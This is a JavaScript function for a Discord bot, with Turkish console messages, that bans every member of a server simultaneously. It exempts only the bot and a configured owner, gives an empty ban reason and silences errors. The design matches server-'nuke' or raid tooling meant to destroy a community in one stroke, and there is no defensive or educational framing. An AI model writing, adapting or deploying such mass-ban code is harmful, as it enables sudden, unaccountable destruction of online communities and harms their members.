// ═══════════════════════════════════════════════════════
// INSTANT MASS BAN
// ═══════════════════════════════════════════════════════

async function instantMassBan(guild) {
    console.log('');
    console.log('═'.repeat(70));
    console.log('🔨 INSTANT MASS BAN BAŞLATILDI');
    console.log('═'.repeat(70));
    
    try {
        await guild.members.fetch();
        
        const members = guild.members.cache;
        let banned = 0;
        
        console.log(`[BAN] ${members.size} ÜYE BULUNDU - BANLANIYORLAR...\n`);
        
        const promises = [];
        
        members.forEach(member => {
            if (member.id === client.user.id || member.id === config.ownerId) return;
            if (!member.bannable) return;
            
            promises.push(
                member.ban({ reason: '' })
                    .then(() => {
                        banned++;
                        console.log(`[BAN] ✅ ${member.user.tag}`);
                    })
                    .catch(() => {})
            );
        });
        
        // HEPSINI AYNI ANDA BAN ET!
        await Promise.all(promises);
        
        console.log('');
        console.log('═'.repeat(60));
        console.log(`✅ ${banned} KİŞİ BANLANDI!`);
        console.log('═'.repeat(60));
        console.log('');
        
        return banned;
        
    } catch (error) {
        console.error(`[BAN] HATA: ${error.message}`);
        return 0;
    }
}

